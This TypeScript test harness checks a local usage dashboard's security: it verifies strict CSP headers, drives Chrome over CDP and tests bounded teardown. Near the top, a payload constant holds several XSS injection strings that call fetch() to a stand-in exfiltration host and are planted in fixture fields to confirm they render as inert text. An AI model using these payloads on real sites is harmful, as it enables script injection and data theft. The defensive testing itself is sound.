import crypto from "node:crypto";
import { getEventListeners } from "node:events";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync, type ChildProcess } from "node:child_process";
import { fileURLToPath } from "node:url";
import type { AddressInfo } from "node:net";

import { LocalEventBuffer } from "../packages/collector-cli/src/buffer";
import { collectorConfigSchema } from "../packages/collector-cli/src/config";
import { createCollectorServer } from "../packages/collector-cli/src/server";
import {
  LoaderGenerationGate,
  domTextReadinessExpression,
  receiptIsContentFree,
  waitForDomText,
} from "./fixtures/dashboard-dom-wait";

const scriptPath = fileURLToPath(import.meta.url);
const repoRoot = path.resolve(path.dirname(scriptPath), "..");
const dashboardPath = path.join(repoRoot, "packages/collector-cli/src/dashboard.html");
const chromePath = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const BROWSER_PROTOCOL_CLOSE_MS = 1_000;
const BROWSER_SIGNAL_GRACE_MS = 1_500;
const BROWSER_PROOF_WALL_MS = 30_000;
const CDP_SOCKET_OPEN_MS = 2_000;
const CDP_COMMAND_MS = 5_000;
// What the hosted CI logs measure, and what they do not.
//
// The one failing run (34742541538) reached debugger_target_unavailable
// 4_648 ms into its browser stage. At that revision this step was a single
// fetch that failed fast, so those 4_648 ms are fixture setup plus spawn plus
// waitForFile(DevToolsActivePort) plus one refused /json/list connect — an
// interval waitForFile's own 10_000 ms budget owns. DEBUGGER_TARGET_MS governs
// a different interval, the DevToolsActivePort read to the first answered
// /json/list. So 4_648 ms is a lower bound on the wrong quantity and no number
// here is a hosted readiness measurement.
// The four passing runs finished their whole browser stage — launch, targets,
// CDP, navigation, DOM, teardown — in 34745131093: 6_887 ms,
// 34745679177: 5_056 ms, 34746308701: 10_583 ms, 34746588143: 7_722 ms. Those
// bound the wall clock, not readiness either. None of those logs prints a line
// at Chrome launch or at the first answered /json/list, which is why the
// governed interval has never been observed on a hosted runner.
// Measured locally instead (studio3, Apple silicon, 4 instrumented launches
// with this argv): spawn to DevToolsActivePort 5_301-5_699 ms, DevToolsActive-
// Port to the first answered /json/list 121-128 ms, answered on the first
// attempt every time. That is the governed interval on a host that has never
// reproduced the failure, so it cannot size this deadline either.
// 10_000 ms is therefore a chosen ceiling, not a fit. It strictly dominates the
// 2_000 ms it replaces, exceeds the only hosted datum there is, leaves 100
// retry steps, and still fits the overall wall clock: 10_000 ms plus the
// slowest observed stage (10_583 ms) stays under BROWSER_PROOF_WALL_MS.
// chosenMargin records how the round number was reached; any multiple in
// [2.0439, 2.2590) rounds to the same 10_000 ms, so the equality asserted below
// pins the constant against an accidental edit and is not evidence that the
// deadline was fitted to data.
// browser_debugger_target_readiness_receipt_present_and_numeric prints the
// governed interval on every run. Until hosted runs have accumulated it, the
// hosted readiness this deadline is meant to cover stays unmeasured.
const DEBUGGER_TARGET_DERIVATION = {
  measuredInterval: "spawn_to_devtools_active_port",
  governedInterval: "devtools_active_port_to_first_answered_json_list",
  hostedReadinessMeasured: false,
  failingRunSpawnToFirstErrorMs: 4_648,
  passingRunBrowserStageMs: {
    34745131093: 6_887,
    34745679177: 5_056,
    34746308701: 10_583,
    34746588143: 7_722,
  },
  chosenMargin: 2.15,
} as const;
const DEBUGGER_TARGET_MS = 10_000;
// The synthetic never-ready checks only need to prove a deadline is enforced,
// so they inject their own. Sizing them from DEBUGGER_TARGET_MS would make
// every run pay the production ceiling for a negative test.
const NEVER_READY_DEADLINE_MS = 1_500;
const DEBUGGER_TARGET_RETRY_MS = 100;
const DASHBOARD_READY_MS = 8_000;
const ABORT_SETTLE_MS = 500;

const payloads = {
  html: `HTML:<img src="https://exfil.invalid/html" onerror="fetch('https://exfil.invalid/html-event')">`,
  svg: `SVG:<svg><script>fetch('https://exfil.invalid/svg')</script><animate onbegin="alert(1)"></animate></svg>`,
  script: `SCRIPT:</script><script>fetch('https://exfil.invalid/script')</script>`,
  event: `EVENT:" autofocus onfocus="fetch('https://exfil.invalid/event')" x="`,
  url: `URL:javascript:fetch('https://exfil.invalid/url')`,
  unicode: `UNICODE:𝕻𝖑𝖎𝖒𝖘𝖔𝖑𝖑 e\u0301 \u202Etxt\u2066 <b>still text</b>`,
} as const;

const snapshotFixture = {
  window: { days: 30 },
  generation: 109,
  projection: {
    status: "ready",
    freshnessAt: "2026-07-17T18:00:00.000Z",
    degraded: false,
  },
  summary: {
    days: 30,
    totals: {
      costUsd: 12.34,
      inputTokens: 1234,
      outputTokens: 234,
      cacheReadTokens: 34,
      cacheCreationTokens: 12,
      sessions: 1,
      sessionsWithTokens: 1,
      events: 3,
    },
    daily: [{ day: "2026-07-17", costUsd: 12.34, tokens: 1468 }],
    byModel: [{ model: payloads.html, calls: 1, inputTokens: 1234, outputTokens: 234, costUsd: 12.34, unpricedCalls: 0 }],
    bySource: [{ source: payloads.svg, sessions: 1, events: 3, costUsd: 12.34 }],
  },
  sessions: [{
    sessionId: `session-${payloads.event}`,
    startedAt: "2026-07-17T17:00:00.000Z",
    source: "codex",
    events: 3,
    inputTokens: 1234,
    outputTokens: 234,
    costUsd: 12.34,
    repoHash: "sha256:securityproofrepo",
    repoLabel: payloads.url,
    repoCount: 2,
  }],
  repos: [{
    repoHash: "sha256:securityproofrepo",
    label: payloads.svg,
    sessions: 1,
    inputTokens: 1234,
    outputTokens: 234,
    costUsd: 12.34,
  }],
  accounts: {
    priorityRepoCount: 1,
    buckets: { priorityUsd: 10, otherUsd: 2, unlinkedUsd: 0.34 },
    accounts: [{
      accountHash: "sha256:securityproofaccount",
      label: payloads.script,
      email: payloads.event,
      machines: [payloads.unicode],
      sessions: 1,
      priorityUsd: 10,
      otherUsd: 2,
      unlinkedUsd: 0.34,
      totalUsd: 12.34,
      subscription: {
        plan: payloads.url,
        usdPerMonth: 20,
        planCostWindow: 20,
        leverage: 1.2,
        byVendor: [{ plans: payloads.html, spendUsd: 12.34, planCostWindow: 10, leverage: 1.2 }],
      },
    }],
  },
  status: {
    retentionDays: 90,
    stats: { count: 3 },
    health: {
      overall: "amber",
      sources: [{
        source: "codex",
        status: "amber",
        reason: payloads.unicode,
        lastEventAt: "2026-07-17T17:59:00.000Z",
        localLastActivityAt: "2026-07-17T17:59:00.000Z",
      }],
    },
  },
};

const sessionFixture = {
  rollup: {
    source: payloads.html,
    startedAt: "2026-07-17T17:00:00.000Z",
    endedAt: "2026-07-17T17:10:00.000Z",
    events: 3,
    tokenEvents: 1,
    inputTokens: 1234,
    outputTokens: 234,
    cacheReadTokens: 34,
    cacheCreationTokens: 12,
    costUsd: 12.34,
  },
  receipts: {
    linkage: [{ repoHash: "sha256:securityproofrepo", branchHash: "sha256:securityproofbranch", headSha: payloads.event, events: 3 }],
    actionMix: [{ actionClass: payloads.svg, n: 3 }],
    eventTypes: [{ eventType: payloads.script, n: 3 }],
    models: [{ model: payloads.url, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 }],
    suppression: { suppressedEvents: 3 },
  },
};

const repoFixture = {
  label: payloads.svg,
  days: 30,
  repoHash: "sha256:securityproofrepo",
  totals: { sessions: 1, events: 3, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 },
  daily: [{ day: "2026-07-17", costUsd: 12.34 }],
  actionMix: [{ actionClass: payloads.html, n: 3 }],
  models: [{ model: payloads.event, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 }],
  branches: [{ branchHash: "sha256:securityproofbranch", sessions: 1, events: 3 }],
};

const settingsFixture = {
  accounts: [
    { accountHash: "sha256:securityproofaccount", label: payloads.script, email: payloads.event },
    { accountHash: "sha256:securityproofcanonical", label: payloads.unicode, email: null },
  ],
  accountAliases: [],
  priorityRepos: [{ url: payloads.url }, { url: `https://exfil.invalid/display-only/${encodeURIComponent(payloads.svg)}` }],
  subscriptions: [{ account: payloads.html, plan: payloads.svg, usdPerMonth: 20, vendor: "other" }],
  detectedIdentities: [{ source: "codex", email: payloads.event, planType: payloads.unicode }],
};

type CheckReceipt = { name: string; passed: boolean; detail: string };
const checks: CheckReceipt[] = [];
function check(name: string, passed: unknown, detail: string) {
  const receipt = { name, passed: Boolean(passed), detail };
  checks.push(receipt);
  console.log(`${receipt.passed ? "PASS" : "FAIL"} ${name} — ${detail}`);
}

function inlineBlock(html: string, tag: "script" | "style") {
  const opening = `<${tag}>`, start = html.indexOf(opening), end = html.indexOf(`</${tag}>`, start + opening.length);
  if (start < 0 || end < 0) throw new Error(`${tag} block missing`);
  return html.slice(start + opening.length, end);
}

function sha256Source(block: string) {
  return `'sha256-${crypto.createHash("sha256").update(block).digest("base64")}'`;
}

function securityHeaders(html: string) {
  return {
    "content-type": "text/html; charset=utf-8",
    "content-security-policy": [
      "default-src 'none'",
      `script-src ${sha256Source(inlineBlock(html, "script"))}`,
      "script-src-attr 'none'",
      `style-src ${sha256Source(inlineBlock(html, "style"))}`,
      "style-src-attr 'none'",
      "connect-src 'self'",
      "base-uri 'none'",
      "form-action 'none'",
      "frame-ancestors 'none'",
      "object-src 'none'",
    ].join("; "),
    "x-content-type-options": "nosniff",
    "x-frame-options": "DENY",
  };
}

async function actualServerHeaderProof() {
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-security-headers-"));
  process.env.PLIMSOLL_HOME = tempDir;
  const buffer = new LocalEventBuffer(path.join(tempDir, "ledger.sqlite"));
  const server = createCollectorServer(collectorConfigSchema.parse({}), buffer);
  try {
    await new Promise<void>((resolve, reject) => {
      server.once("error", reject);
      server.listen(0, "127.0.0.1", resolve);
    });
    const port = (server.address() as AddressInfo).port;
    const response = await fetch(`http://127.0.0.1:${port}/`);
    const html = await response.text();
    const csp = response.headers.get("content-security-policy") ?? "";
    const expectedScript = sha256Source(inlineBlock(html, "script"));
    const expectedStyle = sha256Source(inlineBlock(html, "style"));
    check(
      "dashboard_headers_strict_csp",
      response.status === 200 &&
        csp.includes("default-src 'none'") &&
        csp.includes(`script-src ${expectedScript}`) &&
        csp.includes(`style-src ${expectedStyle}`) &&
        csp.includes("script-src-attr 'none'") &&
        csp.includes("style-src-attr 'none'") &&
        csp.includes("connect-src 'self'") &&
        csp.includes("frame-ancestors 'none'") &&
        !csp.includes("'unsafe-inline'") &&
        !csp.includes("'unsafe-eval'") &&
        !csp.includes("https:") &&
        !csp.includes("http:") &&
        !csp.includes(" *"),
      csp,
    );
    check(
      "dashboard_headers_frame_mime_no_cors",
      response.headers.get("x-frame-options") === "DENY" &&
        response.headers.get("x-content-type-options") === "nosniff" &&
        response.headers.get("access-control-allow-origin") === null,
      JSON.stringify({
        frame: response.headers.get("x-frame-options"),
        nosniff: response.headers.get("x-content-type-options"),
        cors: response.headers.get("access-control-allow-origin"),
      }),
    );
  } finally {
    if (server.listening) await new Promise<void>((resolve) => server.close(() => resolve()));
    buffer.close();
    fs.rmSync(tempDir, { recursive: true, force: true });
  }
}

type TimeoutStage =
  | "browser_proof_overall"
  | "cdp_socket_open"
  | "cdp_command"
  | "dashboard_readiness"
  | "debugger_startup"
  | "debugger_target";

export class ProofTimeoutError extends Error {
  constructor(readonly stage: TimeoutStage, detail?: string, readonly elapsedMs?: number) {
    super(detail ? `proof_timeout:${stage}:${detail}` : `proof_timeout:${stage}`);
    this.name = "ProofTimeoutError";
  }
}

type CdpEvent = Record<string, unknown>;
type SocketListener = (event: Event) => void;
type CdpSocket = {
  readyState: number;
  addEventListener: (type: string, listener: SocketListener, options?: AddEventListenerOptions | boolean) => void;
  removeEventListener: (type: string, listener: SocketListener, options?: EventListenerOptions | boolean) => void;
  send: (data: string) => void;
  close: () => void;
};

type CdpWaiter = {
  resolve: (value: unknown) => void;
  reject: (error: Error) => void;
};

type CdpMethod = "Page.enable" | "Runtime.enable" | "Network.enable" | "Log.enable" |
  "Emulation.setDeviceMetricsOverride" | "Page.navigate" | "Runtime.evaluate" | "Browser.close";

export class CdpClient {
  private nextId = 1;
  private closed = false;
  private readonly pending = new Map<number, CdpWaiter>();
  private readonly handlers = new Map<string, Array<(params: CdpEvent) => void>>();
  private readonly onMessage = (event: Event) => {
    let message: { id?: number; method?: string; params?: CdpEvent; result?: unknown; error?: unknown };
    try {
      message = JSON.parse(String((event as MessageEvent).data)) as typeof message;
    } catch {
      this.failPending(new Error("cdp_protocol_invalid"));
      return;
    }
    if (message.id !== undefined) {
      const waiter = this.pending.get(message.id);
      if (!waiter) return;
      if (message.error) waiter.reject(new Error("cdp_command_rejected"));
      else waiter.resolve(message.result);
      return;
    }
    if (message.method) {
      for (const handler of this.handlers.get(message.method) ?? []) handler(message.params ?? {});
    }
  };
  private readonly onSocketFailure = () => this.failPending(new Error("cdp_socket_closed"));

  private constructor(
    private readonly socket: CdpSocket,
    private readonly defaultSignal?: AbortSignal,
  ) {
    socket.addEventListener("message", this.onMessage);
    socket.addEventListener("error", this.onSocketFailure);
    socket.addEventListener("close", this.onSocketFailure);
  }

  static async connect(
    url: string,
    options: {
      timeoutMs?: number;
      signal?: AbortSignal;
      socketFactory?: (url: string) => CdpSocket;
    } = {},
  ) {
    const timeoutMs = options.timeoutMs ?? CDP_SOCKET_OPEN_MS;
    const socket = (options.socketFactory ?? ((value) => new WebSocket(value) as CdpSocket))(url);
    await new Promise<void>((resolve, reject) => {
      let settled = false;
      const cleanup = () => {
        clearTimeout(timer);
        socket.removeEventListener("open", onOpen);
        socket.removeEventListener("error", onError);
        options.signal?.removeEventListener("abort", onAbort);
      };
      const finish = (error?: Error) => {
        if (settled) return;
        settled = true;
        cleanup();
        if (error) {
          try { socket.close(); } catch { /* best effort for a connecting socket */ }
          reject(error);
        } else {
          resolve();
        }
      };
      const onOpen: SocketListener = () => finish();
      const onError: SocketListener = () => finish(new Error("cdp_socket_open_failed"));
      const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
      const timer = setTimeout(() => finish(new ProofTimeoutError("cdp_socket_open")), timeoutMs);
      socket.addEventListener("open", onOpen, { once: true });
      socket.addEventListener("error", onError, { once: true });
      options.signal?.addEventListener("abort", onAbort, { once: true });
      if (options.signal?.aborted) onAbort();
      else if (socket.readyState === WebSocket.OPEN) finish();
    });
    return new CdpClient(socket, options.signal);
  }

  static fromSocketForProof(socket: CdpSocket, signal?: AbortSignal) {
    return new CdpClient(socket, signal);
  }

  get pendingCount() {
    return this.pending.size;
  }

  on(method: string, handler: (params: CdpEvent) => void) {
    const entries = this.handlers.get(method) ?? [];
    entries.push(handler);
    this.handlers.set(method, entries);
  }

  send<T = Record<string, unknown>>(
    method: CdpMethod,
    params: Record<string, unknown> = {},
    options: { timeoutMs?: number; signal?: AbortSignal | null } = {},
  ) {
    if (this.closed || this.socket.readyState !== WebSocket.OPEN) {
      return Promise.reject<T>(new Error("cdp_socket_not_open"));
    }
    const id = this.nextId++;
    const timeoutMs = options.timeoutMs ?? CDP_COMMAND_MS;
    const signal = options.signal === undefined ? this.defaultSignal : options.signal ?? undefined;
    const startedAt = performance.now();
    return new Promise<T>((resolve, reject) => {
      let settled = false;
      const cleanup = () => {
        clearTimeout(timer);
        signal?.removeEventListener("abort", onAbort);
        this.pending.delete(id);
      };
      const finish = (error: Error | null, value?: unknown) => {
        if (settled) return;
        settled = true;
        cleanup();
        if (error) reject(error);
        else resolve(value as T);
      };
      const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
      const timer = setTimeout(() => finish(new ProofTimeoutError(
        "cdp_command", method, Math.round(performance.now() - startedAt),
      )), timeoutMs);
      this.pending.set(id, {
        resolve: (value) => finish(null, value),
        reject: (error) => finish(error),
      });
      signal?.addEventListener("abort", onAbort, { once: true });
      if (signal?.aborted) {
        onAbort();
        return;
      }
      try {
        this.socket.send(JSON.stringify({ id, method, params }));
      } catch {
        finish(new Error("cdp_send_failed"));
      }
    });
  }

  close() {
    if (this.closed) return;
    this.closed = true;
    this.failPending(new Error("cdp_client_closed"));
    this.handlers.clear();
    this.socket.removeEventListener("message", this.onMessage);
    this.socket.removeEventListener("error", this.onSocketFailure);
    this.socket.removeEventListener("close", this.onSocketFailure);
    try { this.socket.close(); } catch { /* process teardown remains authoritative */ }
  }

  private failPending(error: Error) {
    for (const waiter of [...this.pending.values()]) waiter.reject(error);
  }
}

function childHasExited(child: ChildProcess) {
  return child.exitCode !== null || child.signalCode !== null;
}

async function waitForChildExit(child: ChildProcess, timeoutMs: number) {
  if (childHasExited(child)) return true;
  return new Promise<boolean>((resolve) => {
    let settled = false;
    const finish = (exited: boolean) => {
      if (settled) return;
      settled = true;
      clearTimeout(timeout);
      child.off("exit", onExit);
      resolve(exited);
    };
    const onExit = () => finish(true);
    const timeout = setTimeout(() => finish(childHasExited(child)), timeoutMs);
    child.once("exit", onExit);
    if (childHasExited(child)) finish(true);
  });
}

async function boundedResult<T>(promise: Promise<T>, timeoutMs: number) {
  let timeout: NodeJS.Timeout | undefined;
  const result = await Promise.race([
    promise.then((value) => ({ status: "settled" as const, value })),
    new Promise<{ status: "timed_out" }>((resolve) => {
      timeout = setTimeout(() => resolve({ status: "timed_out" }), timeoutMs);
    }),
  ]);
  if (timeout) clearTimeout(timeout);
  return result;
}

async function shutdownBrowser(
  cdp: CdpClient | undefined,
  chrome: ChildProcess,
  timing = {
    protocolCloseMs: BROWSER_PROTOCOL_CLOSE_MS,
    signalGraceMs: BROWSER_SIGNAL_GRACE_MS,
  },
) {
  const startedAt = Date.now();
  let protocolClose: "not_connected" | "acknowledged" | "rejected" | "timed_out" = "not_connected";
  if (cdp && !childHasExited(chrome)) {
    try {
      await cdp.send("Browser.close", {}, { timeoutMs: timing.protocolCloseMs, signal: null });
      protocolClose = "acknowledged";
    } catch (error) {
      protocolClose = error instanceof ProofTimeoutError ? "timed_out" : "rejected";
    }
  }
  cdp?.close();

  if (await waitForChildExit(chrome, timing.protocolCloseMs)) {
    return { exited: true, protocolClose, escalatedTo: "none" as const, durationMs: Date.now() - startedAt };
  }

  chrome.kill("SIGTERM");
  if (await waitForChildExit(chrome, timing.signalGraceMs)) {
    return { exited: true, protocolClose, escalatedTo: "SIGTERM" as const, durationMs: Date.now() - startedAt };
  }

  chrome.kill("SIGKILL");
  const exited = await waitForChildExit(chrome, timing.signalGraceMs);
  if (!exited) throw new Error(`Chrome did not exit after bounded SIGKILL teardown (pid ${chrome.pid ?? "unknown"})`);
  return { exited: true, protocolClose, escalatedTo: "SIGKILL" as const, durationMs: Date.now() - startedAt };
}

async function proveBoundedSignalEscalation() {
  const child = spawn(process.execPath, [
    "-e",
    "process.on('SIGTERM',()=>{});process.stdout.write('ready\\n');setInterval(()=>{},1000)",
  ], {
    env: { PATH: process.env.PATH ?? "/usr/bin:/bin" },
    stdio: ["ignore", "pipe", "ignore"],
  });
  try {
    await waitForChildReady(child);
    const receipt = await shutdownBrowser(undefined, child, {
      protocolCloseMs: 25,
      signalGraceMs: 100,
    });
    check(
      "browser_teardown_escalates_after_sigterm_resistance",
      receipt.exited && receipt.escalatedTo === "SIGKILL" && receipt.durationMs <= 500,
      JSON.stringify(receipt),
    );
  } finally {
    if (!childHasExited(child)) {
      child.kill("SIGKILL");
      await waitForChildExit(child, 500);
    }
  }
}

export class NeverResolvingSocket implements CdpSocket {
  private readonly listeners = new Map<string, Set<SocketListener>>();
  readyState: number;
  closed = false;
  sends = 0;

  constructor(readyState: number = WebSocket.OPEN) {
    this.readyState = readyState;
  }

  addEventListener(type: string, listener: SocketListener) {
    const entries = this.listeners.get(type) ?? new Set<SocketListener>();
    entries.add(listener);
    this.listeners.set(type, entries);
  }

  removeEventListener(type: string, listener: SocketListener) {
    const entries = this.listeners.get(type);
    entries?.delete(listener);
    if (entries?.size === 0) this.listeners.delete(type);
  }

  send() {
    this.sends += 1;
  }

  close() {
    this.closed = true;
    this.readyState = WebSocket.CLOSED;
  }

  get listenerCount() {
    return [...this.listeners.values()].reduce((total, entries) => total + entries.size, 0);
  }
}

async function closeFixtureServer(server: http.Server) {
  if (!server.listening) return true;
  server.closeAllConnections();
  const result = await boundedResult(
    new Promise<void>((resolve) => server.close(() => resolve())),
    ABORT_SETTLE_MS,
  );
  if (result.status === "timed_out") server.closeAllConnections();
  return result.status === "settled";
}

async function runWithBrowserWatchdog<T>(options: {
  operation: Promise<T>;
  controller: AbortController;
  cleanup: () => Promise<void>;
  timeoutMs: number;
}) {
  let timeout: NodeJS.Timeout | undefined;
  const watchdog = new Promise<never>((_resolve, reject) => {
    timeout = setTimeout(() => {
      options.controller.abort();
      void options.cleanup().catch(() => undefined);
      reject(new ProofTimeoutError("browser_proof_overall"));
    }, options.timeoutMs);
  });
  try {
    return await Promise.race([options.operation, watchdog]);
  } finally {
    if (timeout) clearTimeout(timeout);
  }
}

async function waitForChildReady(child: ChildProcess) {
  await new Promise<void>((resolve, reject) => {
    let settled = false;
    const finish = (error?: Error) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      child.off("error", onError);
      child.stdout?.off("data", onData);
      if (error) reject(error);
      else resolve();
    };
    const onError = () => finish(new Error("fixture_child_failed"));
    const onData = () => finish();
    const timer = setTimeout(() => finish(new Error("fixture_child_not_ready")), 1_000);
    child.once("error", onError);
    child.stdout?.once("data", onData);
  });
}

export async function runNeverResolvingCdpScenario(fixtureRoot?: string) {
  const profile = fs.mkdtempSync(path.join(
    fixtureRoot ?? os.tmpdir(),
    "plimsoll-dashboard-never-cdp-",
  ));
  const privateSentinel = "NEVER_RESOLVING_CDP_PRIVATE_SENTINEL";
  fs.writeFileSync(path.join(profile, "sentinel"), privateSentinel);
  const child = spawn(process.execPath, [
    "-e",
    // Deliberately exceed the 50ms CDP watchdog during fixture startup.
    "process.on('SIGTERM',()=>{});setTimeout(()=>process.stdout.write('ready\\n'),100);setInterval(()=>{},1000)",
  ], {
    env: { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: profile },
    stdio: ["ignore", "pipe", "ignore"],
  });
  if (fixtureRoot && child.pid) {
    fs.writeFileSync(path.join(fixtureRoot, "child.pid"), `${child.pid}\n`);
  }
  const socket = new NeverResolvingSocket();
  const controller = new AbortController();
  const cdp = CdpClient.fromSocketForProof(socket, controller.signal);
  let cleanupPromise: Promise<void> | undefined;
  let shutdownReceipt: Awaited<ReturnType<typeof shutdownBrowser>> | undefined;
  const cleanup = () => cleanupPromise ??= (async () => {
    controller.abort();
    try {
      shutdownReceipt = await shutdownBrowser(cdp, child, {
        protocolCloseMs: 25,
        signalGraceMs: 100,
      });
    } finally {
      fs.rmSync(profile, { recursive: true, force: true });
    }
  })();

  let timeoutError: unknown;
  // The watchdog must exercise a pending CDP command in a ready, resistant
  // child. Startup has its own unchanged, bounded readiness deadline.
  try { await waitForChildReady(child); }
  catch (error) { await cleanup(); throw error; }
  const operation = (async () => {
    await cdp.send("Runtime.evaluate", {}, { timeoutMs: 1_000 });
  })();
  try {
    await runWithBrowserWatchdog({ operation, controller, cleanup, timeoutMs: 50 });
  } catch (error) {
    timeoutError = error;
  } finally {
    await cleanup();
  }
  const operationSettlement = await boundedResult(operation.then(
    () => "fulfilled" as const,
    () => "rejected" as const,
  ), ABORT_SETTLE_MS);
  return {
    cdp,
    child,
    operationSettlement,
    privateSentinel,
    profile,
    shutdownReceipt,
    socket,
    timeoutError,
  };
}

async function proveNeverResolvingCdpCleanup() {
  const connectingSocket = new NeverResolvingSocket(WebSocket.CONNECTING);
  let connectError: unknown;
  try {
    await CdpClient.connect("ws://proof.invalid", {
      timeoutMs: 25,
      socketFactory: () => connectingSocket,
    });
  } catch (error) {
    connectError = error;
  }
  check(
    "cdp_socket_open_timeout_settles_socket_and_listeners",
    connectError instanceof ProofTimeoutError &&
      connectError.message === "proof_timeout:cdp_socket_open" &&
      connectingSocket.closed &&
      connectingSocket.listenerCount === 0,
    JSON.stringify({
      error: connectError instanceof Error ? connectError.message : "missing",
      socketClosed: connectingSocket.closed,
      listeners: connectingSocket.listenerCount,
    }),
  );

  const commandSocket = new NeverResolvingSocket();
  const commandClient = CdpClient.fromSocketForProof(commandSocket);
  let commandError: unknown;
  try {
    await commandClient.send("Runtime.evaluate", {}, { timeoutMs: 25, signal: null });
  } catch (error) {
    commandError = error;
  } finally {
    commandClient.close();
  }
  check(
    "cdp_command_timeout_settles_timer_pending_map_socket_and_listeners",
    commandError instanceof ProofTimeoutError &&
      commandError.message === "proof_timeout:cdp_command:Runtime.evaluate" &&
      commandClient.pendingCount === 0 &&
      commandSocket.closed &&
      commandSocket.listenerCount === 0,
    JSON.stringify({
      error: commandError instanceof Error ? commandError.message : "missing",
      pendingCommands: commandClient.pendingCount,
      socketClosed: commandSocket.closed,
      listeners: commandSocket.listenerCount,
    }),
  );

  const scenario = await runNeverResolvingCdpScenario();
  check(
    "never_resolving_cdp_outer_watchdog_cleans_process_profile_socket_and_timers",
    scenario.timeoutError instanceof ProofTimeoutError &&
      scenario.timeoutError.message === "proof_timeout:browser_proof_overall" &&
      !scenario.timeoutError.message.includes(scenario.privateSentinel) &&
      scenario.shutdownReceipt?.exited === true &&
      scenario.shutdownReceipt.escalatedTo === "SIGKILL" &&
      childHasExited(scenario.child) &&
      !fs.existsSync(scenario.profile) &&
      scenario.cdp.pendingCount === 0 &&
      scenario.socket.sends === 2 &&
      scenario.socket.closed &&
      scenario.socket.listenerCount === 0 &&
      scenario.operationSettlement.status === "settled" &&
      scenario.operationSettlement.value === "rejected",
    JSON.stringify({
      error: scenario.timeoutError instanceof Error ? scenario.timeoutError.message : "missing",
      shutdownReceipt: scenario.shutdownReceipt,
      processExited: childHasExited(scenario.child),
      profileRemoved: !fs.existsSync(scenario.profile),
      pendingCommands: scenario.cdp.pendingCount,
      commandsSent: scenario.socket.sends,
      socketClosed: scenario.socket.closed,
      socketListeners: scenario.socket.listenerCount,
      operationSettlement: scenario.operationSettlement,
    }),
  );
}

function pidIsLive(pid: number) {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function proveTimeoutExitSurface() {
  const fixtureRoot = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-timeout-exit-"));
  let fixturePid = 0;
  try {
    const result = spawnSync(
      process.execPath,
      ["--import", path.join(repoRoot, "node_modules", "tsx", "dist", "loader.mjs"), scriptPath],
      {
        encoding: "utf8",
        env: {
          HOME: fixtureRoot,
          PATH: process.env.PATH ?? "/usr/bin:/bin",
          PLIMSOLL_DASHBOARD_TIMEOUT_EXIT_FIXTURE: "1",
          PLIMSOLL_DASHBOARD_TIMEOUT_FIXTURE_ROOT: fixtureRoot,
        },
        killSignal: "SIGKILL",
        timeout: 5_000,
      },
    );
    const pidFile = path.join(fixtureRoot, "child.pid");
    fixturePid = fs.existsSync(pidFile) ? Number(fs.readFileSync(pidFile, "utf8").trim()) : 0;
    const remaining = fs.readdirSync(fixtureRoot).filter((entry) => entry !== "child.pid");
    const expectedError = JSON.stringify({
      proof: "dashboard-security",
      error: "proof_timeout",
      stage: "browser_proof_overall",
    });
    check(
      "timeout_process_exits_nonzero_content_free_and_leaves_no_profile_or_child",
      result.status === 1 &&
        result.signal === null &&
        result.stdout === "" &&
        result.stderr.trim() === expectedError &&
        fixturePid > 0 &&
        !pidIsLive(fixturePid) &&
        remaining.length === 0,
      JSON.stringify({
        status: result.status,
        signal: result.signal,
        stdoutBytes: Buffer.byteLength(result.stdout ?? ""),
        stderr: result.stderr.trim(),
        childExited: fixturePid > 0 && !pidIsLive(fixturePid),
        remainingProfileEntries: remaining,
      }),
    );
  } finally {
    if (fixturePid > 0 && pidIsLive(fixturePid)) {
      try { process.kill(fixturePid, "SIGKILL"); } catch { /* best effort fixture cleanup */ }
    }
    fs.rmSync(fixtureRoot, { recursive: true, force: true });
  }
}

function abortableDelay(ms: number, signal: AbortSignal) {
  return new Promise<void>((resolve, reject) => {
    let settled = false;
    const finish = (error?: Error) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      signal.removeEventListener("abort", onAbort);
      if (error) reject(error);
      else resolve();
    };
    const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
    const timer = setTimeout(() => finish(), ms);
    signal.addEventListener("abort", onAbort, { once: true });
    if (signal.aborted) onAbort();
  });
}

async function waitForFile(file: string, process: ChildProcess, signal: AbortSignal) {
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    if (fs.existsSync(file)) return;
    if (signal.aborted) throw new ProofTimeoutError("browser_proof_overall");
    if (childHasExited(process)) {
      throw new Error("chrome_exited_before_debugger_startup");
    }
    await abortableDelay(25, signal);
  }
  throw new ProofTimeoutError("debugger_startup");
}

// Resolves on the step or as soon as the deadline/outer abort fires, so the
// caller re-checks its own deadline instead of inheriting a delay error.
function debuggerRetryStep(ms: number, signal: AbortSignal) {
  return new Promise<void>((resolve) => {
    const finish = () => {
      clearTimeout(timer);
      signal.removeEventListener("abort", finish);
      resolve();
    };
    const timer = setTimeout(finish, ms);
    signal.addEventListener("abort", finish, { once: true });
    if (signal.aborted) finish();
  });
}

// Chrome answers /json/list with a JSON array of target objects, each carrying
// a type. Anything else — a non-array, or an array of something that is not a
// target — is a body this step cannot interpret, not a readiness state. Only
// type is required: a target that already has a debugger attached is published
// without webSocketDebuggerUrl, and picking the page target handles that.
function parseDebuggerTargets(body: string) {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return undefined;
  }
  if (!Array.isArray(parsed)) return undefined;
  const shaped = parsed.every((entry) =>
    typeof entry === "object" && entry !== null && typeof (entry as { type?: unknown }).type === "string");
  return shaped ? parsed as Array<{ type: string; webSocketDebuggerUrl: string }> : undefined;
}

type DebuggerTargetOptions = {
  // Defaults to the shipped DEBUGGER_TARGET_MS. Injected only by the synthetic
  // never-ready checks, which must not pay the production ceiling.
  deadlineMs?: number;
  // Receives the number of /json/list attempts made, on success or failure.
  onAttempts?: (attempts: number) => void;
};

